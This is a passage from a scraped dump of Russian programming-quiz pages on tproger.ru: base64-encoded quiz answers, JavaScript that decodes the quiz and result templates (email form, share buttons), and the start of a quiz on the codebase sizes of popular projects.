JlZmVycmVyXCI+RW50ZXJwcmlzZVx1MjEyMjxcL2E+LiBcdTA0MmRcdTA0NDJcdTA0M2UgXHUwNDQ4XHUwNDQzXHUwNDQyXHUwNDNlXHUwNDQ3XHUwNDNkXHUwNDRiXHUwNDM5IFx1MDQ0Zlx1MDQzN1x1MDQ0Ylx1MDQzYSwgXHUwNDMyXHUwNDRiXHUwNDQxXHUwNDNjXHUwNDM1XHUwNDM4XHUwNDMyXHUwNDMwXHUwNDRlXHUwNDQ5XHUwNDM4XHUwNDM5IFx1MDQzZFx1MDQzNVx1MDQzYVx1MDQzZVx1MDQ0Mlx1MDQzZVx1MDQ0MFx1MDQ0Ylx1MDQzNSBcdTA0M2VcdTA0NDFcdTA0M2VcdTA0MzFcdTA0MzVcdTA0M2RcdTA0M2RcdTA0M2VcdTA0NDFcdTA0NDJcdTA0MzggRW50ZXJwcmlzZS1cdTA0NDBcdTA0MzBcdTA0MzdcdTA0NDBcdTA0MzBcdTA0MzFcdTA0M2VcdTA0NDJcdTA0M2FcdTA0MzggXHUwNDM4IFx1MDQzZVx1MDQ0Mlx1MDQzZFx1MDQzZVx1MDQ0OFx1MDQzNVx1MDQzZFx1MDQzOFx1MDQzNSBcdTA0M2EgXHUwNDNkXHUwNDM1XHUwNDM5IEhSLVx1MDQzY1x1MDQzNVx1MDQzZFx1MDQzNVx1MDQzNFx1MDQzNlx1MDQzNVx1MDQ0MFx1MDQzZVx1MDQzMi48XC9wPlxuIiwiY29ycmVjdCI6IjEiLCJ2b3RlZCI6IjQ4NyIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxOTAxIiwicXVlc3Rpb25faWQiOiI1MzciLCJ0ZXh0IjoiXHUwNDE0XHUwNDMwXHUwNDMyXHUwNDNkXHUwNDNlIFx1MDQzZlx1MDQzZVx1MDQ0MFx1MDQzMCBcdTA0NDNcdTA0NDdcdTA0MzhcdTA0NDJcdTA0NGMgSGFza2VsbCEiLCJkZXNjciI6IjxwPlx1MDQyMVx1MDQzZlx1MDQzZVx1MDQ0MFx1MDQ0MyBcdTA0M2RcdTA0MzVcdTA0NDIsIFx1MDQzZlx1MDQzZVx1MDQ0MFx1MDQzMCwgXHUwNDNkXHUwNDNlIFx1MDQ0ZFx1MDQ0Mlx1MDQzZSBcdTA0M2RcdTA0MzUgSGFza2VsbCwgXHUwNDMwIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvcHJvZ3JhbW1pbmctbGFuZ3VhZ2UtZW50ZXJwcmlzZS10bVwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPkVudGVycHJpc2VcdTIxMjI8XC9hPi4gXHUwNDJkXHUwNDQyXHUwNDNlIFx1MDQ0OFx1MDQ0M1x1MDQ0Mlx1MDQzZVx1MDQ0N1x1MDQzZFx1MDQ0Ylx1MDQzOSBcdTA0NGZcdTA0MzdcdTA0NGJcdTA0M2EsIFx1MDQzMlx1MDQ0Ylx1MDQ0MVx1MDQzY1x1MDQzNVx1MDQzOFx1MDQzMlx1MDQzMFx1MDQ0ZVx1MDQ0OVx1MDQzOFx1MDQzOSBcdTA0M2RcdTA0MzVcdTA0M2FcdTA0M2VcdTA0NDJcdTA0M2VcdTA0NDBcdTA0NGJcdTA0MzUgXHUwNDNlXHUwNDQxXHUwNDNlXHUwNDMxXHUwNDM1XHUwNDNkXHUwNDNkXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDM4IEVudGVycHJpc2UtXHUwNDQwXHUwNDMwXHUwNDM3XHUwNDQwXHUwNDMwXHUwNDMxXHUwNDNlXHUwNDQyXHUwNDNhXHUwNDM4IFx1MDQzOCBcdTA0M2VcdTA0NDJcdTA0M2RcdTA0M2VcdTA0NDhcdTA0MzVcdTA0M2RcdTA0MzhcdTA0MzUgXHUwNDNhIFx1MDQzZFx1MDQzNVx1MDQzOSBIUi1cdTA0M2NcdTA0MzVcdTA0M2RcdTA0MzVcdTA0MzRcdTA0MzZcdTA0MzVcdTA0NDBcdTA0M2VcdTA0MzIuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiI0MjgiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTkxMSIsInF1ZXN0aW9uX2lkIjoiNTM3IiwidGV4dCI6Ilx1MDQxZVx1MDQzMVx1MDQ0Ylx1MDQ0N1x1MDQzZFx1MDQ0Ylx1MDQzOSBKUywgXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDNlIFx1MDQ0MSBcdTA0M2VcdTA0NDhcdTA0MzhcdTA0MzFcdTA0M2FcdTA0MzBcdTA0M2NcdTA0MzgiLCJkZXNjciI6IjxwPlx1MDQxZFx1MDQzNVx1MDQ0Mi4gXHUwNDJkXHUwNDQyXHUwNDNlIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvcHJvZ3JhbW1pbmctbGFuZ3VhZ2UtZW50ZXJwcmlzZS10bVwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPkVudGVycHJpc2VcdTIxMjI8XC9hPiwgXHUwNDQ4XHUwNDQzXHUwNDQyXHUwNDNlXHUwNDQ3XHUwNDNkXHUwNDRiXHUwNDM5IFx1MDQ0Zlx1MDQzN1x1MDQ0Ylx1MDQzYSwgXHUwNDMyXHUwNDRiXHUwNDQxXHUwNDNjXHUwNDM1XHUwNDM4XHUwNDMyXHUwNDMwXHUwNDRlXHUwNDQ5XHUwNDM4XHUwNDM5IFx1MDQzZFx1MDQzNVx1MDQzYVx1MDQzZVx1MDQ0Mlx1MDQzZVx1MDQ0MFx1MDQ0Ylx1MDQzNSBcdTA0M2VcdTA0NDFcdTA0M2VcdTA0MzFcdTA0MzVcdTA0M2RcdTA0M2RcdTA0M2VcdTA0NDFcdTA0NDJcdTA0MzggRW50ZXJwcmlzZS1cdTA0NDBcdTA0MzBcdTA0MzdcdTA0NDBcdTA0MzBcdTA0MzFcdTA0M2VcdTA0NDJcdTA0M2FcdTA0MzggXHUwNDM4IFx1MDQzZVx1MDQ0Mlx1MDQzZFx1MDQzZVx1MDQ0OFx1MDQzNVx1MDQzZFx1MDQzOFx1MDQzNSBcdTA0M2EgXHUwNDNkXHUwNDM1XHUwNDM5IEhSLVx1MDQzY1x1MDQzNVx1MDQzZFx1MDQzNVx1MDQzNFx1MDQzNlx1MDQzNVx1MDQ0MFx1MDQzZVx1MDQzMi48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjI0MiIsImZvcl9yZXN1bHQiOiItMSJ9XX1dfQ==";var quiz_data=JSON.parse(window.atob(quiz_data_stringify));var quiz_template=decodeURIComponent(escape(window.atob('PCVxdWl6LnF1ZXN0aW9ucy5mb3JFYWNoKGZ1bmN0aW9uKHF1ZXN0aW9uLCBpLCBhcnIpIHslPgoKPGRpdiBjbGFzcz0icXVpel9pdGVtIiBpZD0icXVpel9pdGVtXzwlPXF1ZXN0aW9uLmlkJT4iIGRhdGEtbnVtPSI8JT1pJT4iIGRhdGEtaWQ9IjwlPXF1ZXN0aW9uLmlkJT4iPgoKICAgIDxkaXYgY2xhc3M9InF1ZXN0aW9uIj4KICAgICAgICA8JT1xdWVzdGlvbi50ZXh0JT4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9ImFuc3dlcnMiPgogICAgICAgIDwlcXVlc3Rpb24uYW5zd2Vycy5mb3JFYWNoKGZ1bmN0aW9uKGFuc3dlciwgbnVtLCBhcnIpIHslPgoKICAgICAgICA8ZGl2IGNsYXNzPSJhbnN3ZXIiIGRhdGEtbnVtPSI8JT1udW0lPiIgZGF0YS1pZD0iPCU9YW5zd2VyLm9wdGlvbnMuaWQlPiI+CgogICAgICAgICAgICA8c3BhbiBkYXRhLXJvbGU9Imljb24iIGNsYXNzPSJxdWl6X2ljb24iPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InF1aXpfY29udHJvbCBhbnN3ZXJfPCU9cXVlc3Rpb24udHlwZSU+Ij5PPC9zcGFuPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImRhc2hpY29ucyIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPjwvc3Bhbj4KICAgICAgICAgICAgPC9zcGFuPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iYW5zd2VyX3RleHQiIGRhdGEtcm9sZT0iYW5zd2VyX3RleHQiPgogICAgICAgICAgICAgICAgPCU9IGFuc3dlci5vcHRpb25zLnRleHQgJT4KCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZXNjciI+PCU9IGFuc3dlci5vcHRpb25zLmRlc2NyICU+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgIDxzcGFuIGRhdGEtcm9sZT0icGVyY2VudCIgY2xhc3M9InBlcmNlbnQiPjxzcGFuIGNsYXNzPSJkYXNoaWNvbnMgZGFzaGljb25zLWNoYXJ0LWJhciI+PC9zcGFuPgoKICAgICAgICAgICAgICAgIDwlPWFuc3dlci5wZXJjZW50ICU+JTwvc3Bhbj4KCiAgICAgICAgPC9kaXY+CgogICAgICAgIDwlfSk7JT4KCiAgICA8L2Rpdj4KCiAgICA8YnV0dG9uIGNsYXNzPSJxdWl6X2J1dHRvbiIgZGF0YS1yb2xlPSJuZXh0IiBkYXRhLWN1cnJlbnQ9IjwlPWklPiIgZGF0YS1uZXh0PSI8JT0oaSsxKSU+Ij7QlNCw0LvRjNGI0LU8L2J1dHRvbj4KCjwvZGl2Pgo8JX0pOyU+CgoKPC9kaXY+Cg==')));var quiz_result_template=decodeURIComponent(escape(window.atob('PGRpdiBjbGFzcz0icXVpel9yZXN1bHQiIGlkPSJxdWl6X3Jlc3VsdCI+CgogICAgPGRpdiBjbGFzcz0icXVpel9yZXN1bHRfdG90YWwiPjwlPSBtYXJrICU+PC9kaXY+CgogICAgPGRpdiBjbGFzcz0icXVpel9yZXN1bHRfdGl0bGUiPjwlPSB0ZXh0LnRpdGxlICU+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJxdWl6X3Jlc3VsdF9kZXNjIj48JT0gdGV4dC5kZXNjICU+PC9kaXY+CiAgICA8JSBjb25zb2xlLmxvZyggIkhFUkU6ICIgKyBzaG93X2VtYWlsX2Zvcm0gKyAiICIrIHNob3dfZW1haWxfZm9ybV9taW5fcmVzICsgIiAiICsgcXVpei5yZXN1bHQpOyAlPgogICAgPCUgaWYoc2hvd19lbWFpbF9mb3JtICYmIHNob3dfZW1haWxfZm9ybV9taW5fcmVzPjAgJiYgcXVpei5yZXN1bHQ+PXNob3dfZW1haWxfZm9ybV9taW5fcmVzKSB7ICU+CiAgICA8ZGl2IGlkPSJxdWl6X3NlbmRfZW1haWxfZm9ybV9ibG9jayI+CiAgICAgICAgPGRpdiBpZD0iX3F1aXpfZW1haWxfZXJyb3JfbWVzc2FnZSIgY2xhc3M9Il9xdWl6X2VtYWlsX2Vycm9yX21lc3NhZ2UiPgogICAgICAgICAgICA8c3BhbiBpZD0icXVpel9lbWFpbF9lcnJvcl9tZXNzYWdlIj48L3NwYW4+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0icXVpel9yZXN1bHRfc2VuZF9lbWFpbCI+CiAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgPGRpdiBpZD0idHBfcXVpel9lbWFpbF9zdGFydF9zZW5kIiBzdHlsZT0nZGlzcGxheTpub25lJz7QmNC00LXRgiDQvtGC0L/RgNCw0LLQutCwLi4uPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cF9xdWl6X2VtYWlsX2lucHV0X2Jsb2NrIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nPCU9IHF1aXpfaWQgJT4nIGlkPSJxdWl6X2lkIiAvPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdoaWRkZW4nIHZhbHVlPSc8JT0gcXVpel9qb2JfaWQgJT4nIGlkPSJxdWl6X2pvYl9pZCIgLz4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nPCU9IHF1aXpfbiAlPicgaWQ9InF1aXpfZW1haWxfc2VuZF9uYW1lIiAvPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdoaWRkZW4nIHZhbHVlPSc8JT0gcXVpel9jb21wYW55ICU+JyBpZD0icXVpel9jb21wYW55IiAvPgoJCQkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJxdWl6X2VtYWlsX2VtYWlsIiBpZD0icXVpel9lbWFpbF9lbWFpbF9pZCIgcGxhY2Vob2xkZXI9IkUtbWFpbCIgY2xhc3M9InRwX3F1aXpfZW1haWxfaW5wdXQiPgoJCQkJCTxkaXYgaWQ9InF1aXpfZW1haWxfc2VuZGluZ19idG4iIGNsYXNzPSJqb2JzX3N0YXJ0X3NraWxsc19zZWFyY2hfYnRuIj4KCQkJCQkJPHN2ZyB3aWR0aD0iMThweCIgaGVpZ2h0PSIxN3B4IiB2aWV3Qm94PSIwIDAgMjYgMTciIHZlcnNpb249IjEuMSI+CgkJCQkJCQkJCTxnIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgoJCQkJCQkJCQkJPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMS4wMDAwMDAsIDEuMDAwMDAwKSIgc3Ryb2tlPSIjNzc3IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiPgoJCQkJCQkJCQkJPHBhdGggZD0iTTE3LjcsMTQuMDYyNSBMMjMuNTgsNy45Mzc1Ij48L3BhdGg+CgkJCQkJCQkJCQk8cGF0aCBkPSJNMTcuNyw3LjA2MjUgTDIzLjU4LDAuOTM3NSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjAuNjQwMDAwLCA0LjAwMDAwMCkgc2NhbGUoMSwgLTEpIHRyYW5zbGF0ZSgtMjAuNjQwMDAwLCAtNC4wMDAwMDApICI+PC9wYXRoPgoJCQkJCQkJCQkJPHBhdGggZD0iTTIzLDcuNSBMMCw3LjUiPjwvcGF0aD4KCQkJCQkJCQkJCTwvZz4KCQkJCQkJCQkJPC9nPgogICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4KCQkJCQk8L2Rpdj4JCQoJCQkJPC9kaXY+PC9wPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InF1aXpfZW1haWxfYWdyZWUiIGNsYXNzPSJxdWl6X2VtYWlsX2FncmVlIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InF1aXpfZW1haWxfYWdyZWUiIGlkPSdxdWl6X2VtYWlsX2FncmVlJyBzdHlsZT0ibWFyZ2luOjA7Ij4g0K8g0YHQvtCz0LvQsNGI0LDRjtGB0Ywg0L3QsCDQv9C10YDQtdC00LDRh9GDINC/0LXRgNGB0L7QvdCw0LvRjNC90YvRhSDQtNCw0L3QvdGL0YUg0YHQvtCz0LvQsNGB0L3QviA8YSBocmVmPSJodHRwczovL3Rwcm9nZXIucnUvd3AtY29udGVudC91cGxvYWRzL2N1c3RvbS9wcml2YWN5X3YxLnBkZiIgdGFyZ2V0PSJfYmxhbmsiPtC/0L7Qu9C40YLQuNC60LUg0LrQvtC90YTQuNC00LXQvdGG0LjQsNC70YzQvdC+0YHRgtC4PC9hPiDQuCA8YSBocmVmPSJodHRwczovL3Rwcm9nZXIucnUvd3AtY29udGVudC91cGxvYWRzL2N1c3RvbS90ZXJtc192MS5wZGYiIHRhcmdldD0iX2JsYW5rIj7Qv9C+0LvRjNC30L7QstCw0YLQtdC70YzRgdC60L7QvNGDINGB0L7Qs9C70LDRiNC10L3QuNGOPC9hPjwvbGFiZWw+CiAgICAgICAgICAgIDwvcD4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0ncXVpel9zZW5kX2VtYWlsX2Zvcm1fYmxvY2tfYWZ0ZXInIHN0eWxlPSdkaXNwbGF5Om5vbmUnPgogICAgICAgICAgICDQodC/0LDRgdC40LHQviEg0KEg0LLQsNC80Lgg0YHQstGP0LbRg9GC0YHRjy4g0JXRgdC70Lgg0L3QsNC50LTQtdGC0YHRjyDQstGA0LXQvNGPLCDQt9Cw0L/QvtC70L3QuNGC0LUg0LggPGEgaHJlZj0iPCU9IHF1aXpfam9iX3VybCAlPiIgPtCx0L7Qu9GM0YjRg9GOINGE0L7RgNC80YMg0L7RgtC60LvQuNC60LA8L2E+INGC0L7QttC1LiDQotCw0Log0YMg0LLQsNGBINCx0YPQtNC10YIg0LHQvtC70YzRiNC1INGI0LDQvdGB0L7Qsi4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0ncXVpel9zZW5kX2VtYWlsX2Zvcm1fYmxvY2tfYWZ0ZXJfaWZfc2VuZCcgc3R5bGU9J2Rpc3BsYXk6bm9uZSc+CiAgICAgICAg0JLRiyDRg9C20LUg0L7RgdGC0LDQstC40LvQuCDRgdCy0L7QuSBlLW1haWwuINCf0L7RgdC80L7RgtGA0LjRgtC1IDxhIGhyZWY9IjwlPSBxdWl6X2pvYl91cmxfdG9fam9iICU+Ij7RgdCw0LzRgyDQstCw0LrQsNC90YHQuNGOPC9hPiDQuCDQt9Cw0L/QvtC70L3QuNGC0LUg0LggPGEgaHJlZj0iPCU9IHF1aXpfam9iX3VybCAlPiI+0LHQvtC70YzRiNGD0Y4g0YTQvtGA0LzRgyDQvtGC0LrQu9C40LrQsDwvYT4g0YLQvtC20LUuINCi0LDQuiDRgyDQstCw0YEg0LHRg9C00LXRgiDQsdC+0LvRjNGI0LUg0YjQsNC90YHQvtCyLgogICAgPC9kaXY+CiAgICA8JSB9ICU+CiAgICA8ZGl2IGNsYXNzPSJxdWl6X3Jlc3VsdF93cmFwcGVyIj4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJxdWl6X3JlZnJlc2hfYnV0dG9uIiBpZD0icmVmcmVzaF9xdWl6IiBkYXRhLXJvbGU9InJlZnJlc2hfcXVpeiI+CiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJkYXNoaWNvbnMgZGFzaGljb25zLWltYWdlLXJvdGF0ZSI+PC9zcGFuPiDQn9C+0L/RgNC+0LHQvtCy0LDRgtGMINC10YnRkSDRgNCw0LcKICAgICAgICA8L2J1dHRvbj4KICAgCiAgICAgICAgPGRpdiBjbGFzcz0icXVpel9zaGFyZV93cmFwcGVyIj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icXVpel9zaGFyZSBxdWl6X3NoYXJlX3ZrIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCk7IiBvbmNsaWNrPSJzb2NpYWxfc2hhcmUoJ2h0dHBzOi8vdmsuY29tL3NoYXJlLnBocD91cmw9JyArIGVuY29kZVVSSSh3aW5kb3cubG9jYXRpb24uaHJlZikgKyAnJnRpdGxlPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpICsgJyZjb21tZW50PdCvINC/0YDQvtGI0ZHQuyAnICsgZW5jb2RlVVJJQ29tcG9uZW50KCc8JT0gcXVpei50aXRsZSAlPicpICsgJy4g0JzQvtC5INGA0LXQt9GD0LvRjNGC0LDRgjogPCU9IHRleHQudGl0bGUgJT4uPCU9IHRleHQuZXh0cmEgJT4maW1hZ2U9JyArIGVuY29kZVVSSSh3aW5kb3cubG9jYXRpb24ub3JpZ2luICsgJy9zaGFyZS9pbWFnZS88JT0gc2hhcmUuc2VyaWFsaXplZCAlPi5wbmcnKSk7Ij48aSBjbGFzcz0iaWNvbi12ayI+PC9pPjwvYnV0dG9uPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJxdWl6X3NoYXJlIHF1aXpfc2hhcmVfZmIiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKTsiIG9uY2xpY2s9InNvY2lhbF9zaGFyZSgnaHR0cDovL3d3dy5mYWNlYm9vay5jb20vc2hhcmVyLnBocD91PScgKyBlbmNvZGVVUklDb21wb25lbnQoKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2xpbmtbcmVsPWNhbm9uaWNhbF0nKSA/IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2xpbmtbcmVsPWNhbm9uaWNhbF0nKS5ocmVmIDogd2luZG93Ll9pb19jb25maWdbJzAuMi4wJ11bMF0ucGFnZV91cmxfY2Fub25pY2FsKSArICcvcmVzdWx0LzwlPSBxdWl6LnFpZCAlPi88JT0gcXVpei5yZXN1bHQgJT4nKSk7Ij48aSBjbGFzcz0iaWNvbi1mYWNlYm9vay0xIj48L2k+PC9idXR0b24+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InF1aXpfc2hhcmUgcXVpel9zaGFyZV90dyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApOyIgb25jbGljaz0ic29jaWFsX3NoYXJlKCdodHRwOi8vdHdpdHRlci5jb20vaW50ZW50L3R3ZWV0P3VybD0nICsgZW5jb2RlVVJJKHdpbmRvdy5sb2NhdGlvbi5ocmVmKSArICcmdGV4dD3QryDQv9GA0L7RiNGR0LsgPCU9IHF1aXoudGl0bGUgJT4uINCc0L7QuSDRgNC10LfRg9C70YzRgtCw0YI6IDwlPSB0ZXh0LnRpdGxlICU+LjwlPSB0ZXh0LmV4dHJhICU+Jyk7Ij48aSBjbGFzcz0iaWNvbi10d2l0dGVyLTEiPjwvaT48L2J1dHRvbj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icXVpel9zaGFyZSBxdWl6X3NoYXJlX3RnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCk7IiBvbmNsaWNrPSJ3aW5kb3cub3BlbigndGc6Ly9tc2dfdXJsP3RleHQ90K8g0L/RgNC+0YjRkdC7IDwlPSBxdWl6LnRpdGxlICU+LiDQnNC+0Lkg0YDQtdC30YPQu9GM0YLQsNGCOiA8JT0gdGV4dC50aXRsZSAlPi48JT0gdGV4dC5leHRyYSAlPiZ1cmw9JyArIGVuY29kZVVSSSh3aW5kb3cubG9jYXRpb24uaHJlZiksICdfc2VsZicpOyI+PGltZyBzcmM9Imh0dHBzOi8vY2RuLnRwcm9nZXIucnUvd3AtaW1hZ2VzL3RnX2hlYWRlci5wbmciPjwvYnV0dG9uPgogICAgICAgIDwvZGl2PiAgICAKICAgIDwvZGl2PgoKCjwvZGl2Pgo=')));if(quiz_data.code_mode){var head=document.head||document.getElementsByTagName('head')[0];var script=document.createElement('script');script.type='text/javascript';script.defer=true;script.src='https://cdn.tproger.ru/wp-content/themes/bliss/assets/plugins/prism/prism.js?x60988';head.appendChild(script);link=document.createElement('link');link.rel='stylesheet';link.type='text/css';link.href='https://cdn.tproger.ru/wp-content/themes/bliss/assets/plugins/prism/prism.css?x60988';head.appendChild(link);}	https://tproger.ru/quiz/2018-trends/	107
eb97f0be-32eb-11e9-9b69-28c2dd5a952f	У кого больше? Тест на знание размеров кодовой базы популярных проектов		Вы когда-нибудь задумывались о том, сколько труда и кода вложено в популярные инструменты, фреймворки и прочие проекты, которыми пользуются тысячи разработчиков? Оценить свои предположения (или интуицию) поможет наш тест!Примечание Количество строк кода измерялось инструментом cloc с настройками по умолчанию. После каждого выбора ответа в комментарии к нему вы найдёте ссылку на коммит, при котором проводился подсчёт. Так вы при желании сможете убедиться, что числа взяты не .\n\n\n setTimeout(function(){quiz_dont_load.style.display='block';quiz_dont_load.innerHTML='Скоро загрузится, клянусь своей IDE!';},5*1000);setTimeout(function(){quiz_dont_load.style.display='block';quiz_dont_load.innerHTML='Ещё совсем немножко, прям милипусенько...';},10*1000);setTimeout(function(){quiz_dont_load.style.display='block';quiz_dont_load.innerHTML='Викторина загружается дольше, чем обычно: попробуйте потанцевать с бубном — отключить AdBlock и перезагрузить страницу :(';},20*1000); \nНачать тест var quiz_data_stringify="";var quiz_data=JSON.parse(window.atob(quiz_data_stringify));var quiz_template=decodeURIComponent(escape(window.atob('PCVxdWl6LnF1ZXN0aW9ucy5mb3JFYWNoKGZ1bmN0aW9uKHF1ZXN0aW9uLCBpLCBhcnIpIHslPgoKPGRpdiBjbGFzcz0icXVpel9pdGVtIiBpZD0icXVpel9pdGVtXzwlPXF1ZXN0aW9uLmlkJT4iIGRhdGEtbnVtPSI8JT1pJT4iIGRhdGEtaWQ9IjwlPXF1ZXN0aW9uLmlkJT4iPgoKICAgIDxkaXYgY2xhc3M9InF1ZXN0aW9uIj4KICAgICAgICA8JT1xdWVzdGlvbi50ZXh0JT4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9ImFuc3dlcnMiPgogICAgICAgIDwlcXVlc3Rpb24uYW5zd2Vycy5mb3JFYWNoKGZ1bmN0aW9uKGFuc3dlciwgbnVtLCBhcnIpIHslPgoKICAgICAgICA8ZGl2IGNsYXNzPSJhbnN3ZXIiIGRhdGEtbnVtPSI8JT1udW0lPiIgZGF0YS1pZD0iPCU9YW5zd2VyLm9wdGlvbnMuaWQlPiI+CgogICAgICAgICAgICA8c3BhbiBkYXRhLXJvbGU9Imljb24iIGNsYXNzPSJxdWl6X2ljb24iPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InF1aXpfY29udHJvbCBhbnN3ZXJfPCU9cXVlc3Rpb24udHlwZSU+Ij5PPC9zcGFuPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImRhc2hpY29ucyIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPjwvc3Bhbj4KICAgICAgICAgICAgPC9zcGFuPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iYW5zd2VyX3RleHQiIGRhdGEtcm9sZT0iYW5zd2VyX3RleHQiPgogICAgICAgICAgICAgICAgPCU9IGFuc3dlci5vcHRpb25zLnRleHQgJT4KCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZXNjciI+PCU9IGFuc3dlci5vcHRpb25zLmRlc2NyICU+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgIDxzcGFuIGRhdGEtcm9sZT0icGVyY2VudCIgY2xhc3M9InBlcmNlbnQiPjxzcGFuIGNsYXNzPSJkYXNoaWNvbnMgZGFzaGljb25zLWNoYXJ0LWJhciI+PC9zcGFuPgoKICAgICAgICAgICAgICAgIDwlPWFuc3dlci5wZXJjZW50ICU+JTwvc3Bhbj4KCiAgICAgICAgPC9kaXY+CgogICAgICAgIDwlfSk7JT4KCiAgICA8L2Rpdj4KCiAgICA8YnV0dG9uIGNsYXNzPSJxdWl6X2J1dHRvbiIgZGF0YS1yb2xlPSJuZXh0IiBkYXRhLWN1cnJlbnQ9IjwlPWklPiIgZGF0YS1uZXh0PSI8JT0oaSsxKSU+Ij7QlNCw0LvRjNGI0LU8L2J1dHRvbj4KCjwvZGl2Pgo8JX0pOyU+CgoKPC9kaXY+Cg==')));var quiz_result_template=decodeURIComponent(escape(window.atob('PGRpdiBjbGFzcz0icXVpel9yZXN1bHQiIGlkPSJxdWl6X3Jlc3VsdCI+CgogICAgPGRpdiBjbGFzcz0icXVpel9yZXN1bHRfdG90YWwiPjwlPSBtYXJrICU+PC9kaXY+CgogICAgPGRpdiBjbGFzcz0icXVpel9yZXN1bHRfdGl0bGUiPjwlPSB0ZXh0LnRpdGxlICU+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJxdWl6X3Jlc3VsdF9kZXNjIj48JT0gdGV4dC5kZXNjICU+PC9kaXY+CiAgICA8JSBjb25zb2xlLmxvZyggIkhFUkU6ICIgKyBzaG93X2VtYWlsX2Zvcm0gKyAiICIrIHNob3dfZW1haWxfZm9ybV9taW5fcmVzICsgIiAiICsgcXVpei5yZXN1bHQpOyAlPgogICAgPCUgaWYoc2hvd19lbWFpbF9mb3JtICYmIHNob3dfZW1haWxfZm9ybV9taW5fcmVzPjAgJiYgcXVpei5yZXN1bHQ+PXNob3dfZW1haWxfZm9ybV9taW5fcmVzKSB7ICU+CiAgICA8ZGl2IGlkPSJxdWl6X3NlbmRfZW1haWxfZm9ybV9ibG9jayI+CiAgICAgICAgPGRpdiBpZD0iX3F1aXpfZW1haWxfZXJyb3JfbWVzc2FnZSIgY2xhc3M9Il9xdWl6X2VtYWlsX2Vycm9yX21lc3NhZ2UiPgogICAgICAgICAgICA8c3BhbiBpZD0icXVpel9lbWFpbF9lcnJvcl9tZXNzYWdlIj48L3NwYW4+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0icXVpel9yZXN1bHRfc2VuZF9lbWFpbCI+CiAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgPGRpdiBpZD0idHBfcXVpel9lbWFpbF9zdGFydF9zZW5kIiBzdHlsZT0nZGlzcGxheTpub25lJz7QmNC00LXRgiDQvtGC0L/RgNCw0LLQutCwLi4uPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cF9xdWl6X2VtYWlsX2lucHV0X2Jsb2NrIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nPCU9IHF1aXpfaWQgJT4nIGlkPS